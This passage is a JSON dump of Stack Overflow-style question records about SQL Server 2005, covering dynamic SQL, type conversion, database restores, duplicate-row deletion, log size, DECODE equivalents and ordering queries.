= N'SELECT SYSTEM AS ''System''\n            , ENTN AS ''Entity''\n            , MED_CTR AS ''Medical Center''\n            , MED_CTR_LEVEL AS ''Medical Center Level''\n            , DEPT_ID AS ''Department ID''\n    FROM V_ROLLUP_SYSTEM_DESC_REV1\n    WHERE (DEPT_ID = '+CONVERT(VARCHAR,@DEPTCODE)+')\n        AND SYSTEM IN ('+@SYS+')'\nPRINT(@SQL)\nEXEC(@SQL)\n</code></pre>\n\n<p>So I want to combine MED_CTR with MED_CTR_LEVEL seperated by a \"/\" and labeled as Medical Center/ Level.  I cant seem to combine it thus far since every method I have tried to add a \"/\" in it has returned me nothing.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":11869761,"title":"Is there a way to change a column's type when returning a dataset from a procedure?","body":"<p>I'm basically looking to do something like this:</p>\n\n<pre><code>SELECT MYCOLUMN AS 'MYALIAS' VARCHAR(500) \nFROM MYTABLE\n</code></pre>\n\n<p>What I'm doing is this:</p>\n\n<pre><code>SELECT COLUMN1 AS 'TEXT',\nCOLUMN 2 AS 'VALUE'\nFROM MYTABLE\n</code></pre>\n\n<p><code>COLUMN2</code> is an <code>INT</code> column, however I need to append a string value with UNION as an \"Other\" selection. Is there a way to return that column as <code>VARCHAR</code> instead without actually building the table beforehand and using <code>INSERT INTO</code> with a <code>CONVERT()</code>? If not, no big deal, I was just looking to see if there was a slick way of doing it.</p>\n"},{"tags":["database","sql-server-2005","database-restore"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":316,"score":2,"question_id":10451261,"title":"Restore SQL Server 2005 database without overwriting DB users","body":"<p>I have a database that I constantly need to restore.</p>\n\n<p>Every time I do so, all the users that have access to DB are deleted and I have to manually add them again.</p>\n\n<p>Is there any way that I can restore the DB but the users remain intact or any script that I run before/after the restore so that I don't have to manually add all the users again?</p>\n"},{"tags":["asp.net","sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":11857923,"title":"Deletion of Invalid Records in SQL on the basis of a Timeout","body":"<p>I have a table which stores the check-in times of employees through Time Machine on the basis of a username. If an employee punches multiple times then there would be multiple records of his check-ins. All those records which come within 1 minute of first record are invalid and must be deleted. If a record which comes more than a minute later of first record is valid and must not be deleted. Then this second valid record may also contains subsequent records which are invalid as they come within 1 min of this second valid record.Such records should also be deleted and so on. How can i do it on all the checkin records of an employee for the current date? The flag field is not in db its just a demonstration that which record is valid and which is invalid.</p>\n\n<pre><code>The Data in the db is as follows.\n\nUsername               Checktime                       CheckType          Flag\n HRA001            7/29/2012 8:16:44 AM                Check-In           Valid \n HRA001            7/29/2012 8:16:46 AM                Check-In           Invalid\n HRA001            7/29/2012 8:16:50 AM                Check-In           Invalid\n HRA001            7/29/2012 8:17:30 AM                Check-In           Invalid \n HRA001            7/29/2012 8:17:50 AM                Check-In           Valid \n HRA001            7/29/2012 8:17:53 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:40 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:54 AM                Check-In           Valid \n HRA001            7/29/2012 8:18:56 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:58 AM                Check-In           Invalid\n HRA001            7/29/2012 8:19:55 AM                Check-In           Valid\n HRA001            7/29/2012 8:20:58 AM                Check-In           Valid\n</code></pre>\n"},{"tags":["sql-server-2005","copy","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":11860693,"title":"copying sql server to another location","body":"<p>I need to copy my db including data from sql server 2008 R2 to another sql server (sql express 2005). I noticed that backup cannot be done from later version to earlier version. What is the best approach I should take?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":71,"score":-4,"question_id":11858902,"title":"How to recognize empty result from SQL","body":"<p>When my select command does not have any result, it throws an exception. Instead I want to continue with the process without exception. How to control this by checking whether there is data retrieved from the select statement?</p>\n\n<p>Here is my query:</p>\n\n<pre><code>sqlid = new SqlCommand(\"SELECT TOP 1 Proj_id FROM Proj_details WHERE Front_end = '\" + strfrontend + \"'ORDER BY Date_time desc\", con);\nid = sqlid.ExecuteScalar().ToString();\n</code></pre>\n"},{"tags":["asp.net","sql","sql-server-2005"],"answer_count":8,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":11839893,"title":"Deleting Invalid Duplicate Rows in SQL","body":"<p>I have a table which stores the check-in times of employees through Time Machine on the basis of a username. If an employee punches multiple times then there would be multiple records of his check-ins which would only have a time difference of few seconds in between. Obviously only the first record is valid. All the other entries are invalid and must be deleted from the Table. How can i do it if i can select all the checkin records of an employee for the current date? </p>\n\n<p>The Data in the db is as follows.</p>\n\n<pre><code>Username               Checktime                       CheckType\n HRA001            7/29/2012 8:16:44 AM                Check-In\n HRA001            7/29/2012 8:16:46 AM                Check-In\n HRA001            7/29/2012 8:16:50 AM                Check-In \n HRA001            7/29/2012 8:16:53 AM                Check-In \n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":282,"score":1,"question_id":3140259,"title":"Log file size is huge","body":"<p>We have one database and we do lot many transactios per day, so the log file size growing too much, and i have tried shrinking it but its not reducing..</p>\n\n<p>What shall i do to reduce the log file size. (We do too many inserts) </p>\n\n<p>Thanks\nSrinivas</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":11852951,"title":"SQL - Determine count of records active at time","body":"<p>I have a table that contains the following information:</p>\n\n<pre><code>Conf_Start_Time\nPart_Start_Time\nPart_End_Time\n</code></pre>\n\n<p>A record is considered to be active at time t if t falls between <code>Part_Start_Time</code> and <code>Part_End_Time</code>.</p>\n\n<p>What I'd like to do is analyze all the records to determine how many records are active given a specified day.  My proposed solution is to loop through each minute in the day (say from 6AM to 9PM) and check each record on that day to determine if the user was active at the specified time, t.</p>\n\n<p>Is there a solution to this in SQL, or should I proceed with the code solution?</p>\n\n<p>In code I would pull all the records to memory, loop through time (6AM to 9PM) and test each record on the specified day to determine if it was active at the current time.  If it's active, I would increment a counter, if not, proceed to the next record.  Next time around, reinitialize the counter and proceed looping through the day.</p>\n\n<p>We're using SQL Server 2005.</p>\n\n<p>UPDATE: The output I'm looking for would be an array of maximum concurrent usage from 6AM to 9PM</p>\n\n<pre><code>Record  Conf_Start_Time    Part_Start_Time     Part_End_Time\n1.      6/5/2012 13:40:00  6/5/2012 13:41:23   6/5/2012 13:45:27\n2.      6/5/2012 13:40:00  6/5/2012 13:40:23   6/5/2012 13:47:29\n3.      6/5/2012 13:40:00  6/5/2012 13:42:55   6/5/2012 13:44:17\n</code></pre>\n\n<p>So at time 13:40:00 0 records are active;   at time 13:41:00 1 record is active;   at time 13:42:00 2 records are active;   at time 13:43:00 3 records are active;</p>\n\n<p>And I need the data for each minute in the day.  And then each day in the month.  Can this type of looping even be done in SQL?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":285,"score":1,"question_id":11851405,"title":"Violation of UNIQUE KEY constraint 'UK_XXX'. Cannot insert duplicate key in object 'dbo.YYY'","body":"<p>I'm trying to update a field in SQL Server 2005 from one table to another field in another table, and I'm getting this whole violation of UNIQUE KEY constraint and I can't seem to figure out where it went wrong with my script. Here's what I have so far:</p>\n\n<pre><code>UPDATE table1\nSET column1 = (SELECT table2.column2\nFROM         table2 INNER JOIN\n                  table1 ON table1.id = table2.id)\n</code></pre>\n\n<p>I'm quite new to SQL and would definitely love some input in regard to this situation. Thank you so much!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":161,"score":4,"question_id":11850170,"title":"sql server combine values in two tables","body":"<p>I am new to SQL in general and even newer to MS SQL. I apologize if the title isn't clear on what I want. </p>\n\n<p>I have two tables an old one that I want to derive data from into a new table. The tables have the exact same columns but different number of rows. The new table has multiple copies of each value in the old table, which only has 2 occurences. see below comparison of two columns: letter and amount.</p>\n\n<p>New table:           </p>\n\n<pre><code>A  0 \nA  0\nA  0\nB  0\nB  0\n</code></pre>\n\n<p>old table:</p>\n\n<pre><code>A  12\nA  0\nB  10\nB  0\nC  23\n</code></pre>\n\n<p>What I want to achieve is adding the values of the amount column from the old table into just the first occurence of the leter in the new table like so:        </p>\n\n<pre><code>A  12 \nA  0\nA  0\nB  10\nB  0\n</code></pre>\n\n<p>Inner join causes all the values to be filled ( so all the A's are set to 12).  </p>\n"},{"tags":["sql","sql-server","sql-server-2005","oracle"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":19653,"score":-2,"question_id":1559241,"title":"DECODE( ) function in SQL Server","body":"<pre><code>SELECT \n  PC_COMP_CODE,\n  'R',\n  PC_RESUB_REF,\n  DECODE(PC_SL_LDGR_CODE,'02','DR','CR'),\n  PC_DEPT_NO DEPT,\n  '',--PC_DEPT_NO,\n  PC_SL_LDGR_CODE+'/'+PC_SL_ACNO,\n  SUM( DECODE(PC_SL_LDGR_CODE,'02',1,-1) *PC_AMOUNT),\n  PC_CHEQUE_NO CHQNO\nFROM GLAS_PDC_CHEQUES\nWHERE PC_RESUB_REF IS NOT NULL AND PC_DISCD NOT IN ('d','D','T') \nGROUP BY PC_RESUB_REF, PC_COMP_CODE, 'JJ', PC_SL_LDGR_CODE+'/'+PC_SL_ACNO, PC_DEPT_NO, PC_CHEQUE_NO, DECODE(PC_SL_LDGR_CODE,'02','DR','CR')\n</code></pre>\n\n<p>Above is a Oracle query; how can I use DECODE() function in SQL Server 2005? </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":11841137,"title":"Fail to use Not Like in sql","body":"<p>I have this Query.</p>\n\n<pre><code>SELECT\nDistinct\n   CASE CHARINDEX( '?', SessionURL)\n       WHEN 0 THEN SessionURL \n       ELSE LEFT(SessionURL, CHARINDEX( '?', SessionURL) - 1) END AS VisitPage , count(*) as [VisitTime] \nFROM VistedURL\n</code></pre>\n\n<p>Its gives following result.<pre>\n         VisitPage               VisitTime\n  a/default.aspx                    99\n  a/home.aspx                       15\n  a/admin/dashboard.aspx            05\n  a/contactus.aspx                  54\n  a/admin/login.aspx                10\n</pre><br>\nI want to use <code>Not Like</code> in above query.means:<br></p>\n\n<p><code>WHERE SessionURL NOT LIKE '%admin%'</code><br></p>\n\n<p>And remove the 3rd and 5th data of above result table which contain <code>admin</code>.But unable to use <code>Not Like</code> in above query.Thanks.</p>\n"},{"tags":["sql","sql-server-2005","sql-manager"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":11840165,"title":"Know how many table is modified on particular date in database in SQL Server 2005","body":"<p>I have a database with 40 tables in it. So I want to find tables which are modified on the particular date like</p>\n\n<ul>\n<li>How many tables were modified on <code>20 Aug 2011</code> in my database?</li>\n</ul>\n\n<p><strong>UPDATE</strong><br>\nplease note that I need the table name and not the record id</p>\n\n<p>like the names of the table whose contents are modified on  <code>20 Aug 2011</code> </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1155,"score":4,"question_id":3221715,"title":"Looking for SQL Optimization Interview Questions","body":"<p>I'm on a project where I was asked to take a quick peek at some reporting SQL (in a SQL Server 2K5 environment) and was surprised at what I found: 4 to 5 levels of subquerys, distinct clauses, unions, and NoLock hints (which were needed because the SQL was running so long it was blocking standard processing) - all in the same set!.</p>\n\n<p>Because I (foolishly :) mentioned that I thought the SQL was inefficient I've been labeled the \"expert\" and have been tasked with creating a test for a couple of interviewees to do that will assess their SQL optimizing abilities. I'm hoping someone can point me to some URLS, or maybe provide a list that I can use to help weed out the good from the bad. </p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":172,"score":1,"question_id":11802668,"title":"SQL Server 2008 Convert from BIGINT to UNIQUEIDENTIFIER/GUID and Back","body":"<p>I am trying to solve a problem very similar to <a href=\"http://stackoverflow.com/questions/10078209/sql-server-2008-convert-from-guid-to-bigint-and-back\">SQL Server 2008 Convert from GUID to Bigint and Back?</a> Unfortunately that example doesn't show the whole process, it only shows converting a GUID back to BIGINT.  </p>\n\n<p>I'll call this a hypothetical problem since I've already decided that storing integers as GUID's isn't very beneficial.  However at this point, I simply want to know why the conversion process isn't working.</p>\n\n<p>Everything looks good until step 5....</p>\n\n<pre><code>SELECT  1 AS Step\n        ,100966116980299\n\nSELECT  2 AS Step\n        ,CONVERT(VARBINARY(8), 100966116980299, 1)\n\nSELECT  3 AS Step\n        ,CONVERT(UNIQUEIDENTIFIER, \n            CONVERT(VARBINARY(8), 100966116980299, 1)\n        )\n\nSELECT  4 AS Step   \n        ,CONVERT(VARBINARY(8), \n            CONVERT(UNIQUEIDENTIFIER, \n                CONVERT(VARBINARY(8), 100966116980299, 1)\n            ), 1\n        )\n\nSELECT  5 AS Step   \n        ,CONVERT(BIGINT, \n            CONVERT(VARBINARY(8), \n                CONVERT(UNIQUEIDENTIFIER, \n                    CONVERT(VARBINARY(8), 100966116980299, 1)\n                ), 1\n            )\n        )\n</code></pre>\n\n<p><strong>Results</strong></p>\n\n<pre><code>Step    Value\n1       100966116980299\n2       0x0F0000014B768901\n3       0100000F-764B-0189-0000-000000000000\n4       0x0F0000014B768901\n5       1080863916129945857\n</code></pre>\n"},{"tags":["sql","sql-server-2005","stored-procedures","string-literals"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11837199,"title":"Is it possible to return literals in a stored procedure to mimic a dataset?","body":"<p>First off, sorry about the goofy question. </p>\n\n<p>What I'm looking for is to return a \"dataset\" of hard-coded data. The reason why I need this or whether it's a good solution or not is irrelevant. I'd just like to know how I can do it. </p>\n\n<p>I basically want to  return, via a <code>SELECT</code>, this \"fake\" dataset.</p>\n\n<pre><code>DisplayText  Value\n-----------  -----\nYes          true\nNo           false\n</code></pre>\n\n<p>I'd rather avoid going through creating a table, populating it and then querying it if can. I'm thinking there's a clever way of doing this through the <code>SELECT</code>, but I haven't the skillz to do it. </p>\n\n<p>Any help would be appreciated. Yes, I know this is goofy. Let's move past that. =)</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":11836200,"title":"SQL ORDER by STRING weird syntax","body":"<p>Is there a less ugly/more programmatic way to solve this:</p>\n\n<pre><code>ORDER BY CASE \n WHEN lessonID = 'lesson_1' Then 1  \n WHEN lessonID = 'lesson_novid_1' Then 2 \n WHEN lessonID = 'lesson_2' Then 3 \n WHEN lessonID = 'lesson_novid_2' Then 4 \n WHEN lessonID = 'lesson_3' Then 5 \n WHEN lessonID = 'lesson_novid_3' Then 6 \n WHEN lessonID = 'lesson_4' Then 7 \n WHEN lessonID = 'lesson_novid_4' Then 8 \n WHEN lessonID = 'lesson_5' Then 9 \n WHEN lessonID = 'lesson_novid_5' Then 10 \n WHEN lessonID = 'lesson_6' Then 11 \n WHEN lessonID = 'lesson_novid_6' Then 12\n WHEN lessonID = 'lesson_7' Then 13 \n WHEN lessonID = 'lesson_novid_7' Then 14\n WHEN lessonID = 'lesson_8' Then 15\n WHEN lessonID = 'lesson_novid_8' Then 16\n WHEN lessonID = 'lesson_9' Then 17\n WHEN lessonID = 'lesson_novid_9' Then 18\n WHEN lessonID = 'lesson_10' Then 19\n WHEN lessonID = 'lesson_novid_10' Then 20\n WHEN lessonID = 'lesson_11' Then 21\n WHEN lessonID = 'lesson_novid_11' Then 22 \n WHEN lessonID = 'lesson_12' Then 23 \n WHEN lessonID = 'lesson_novid_12' Then 24\nEnd ASC\n</code></pre>\n"}]}
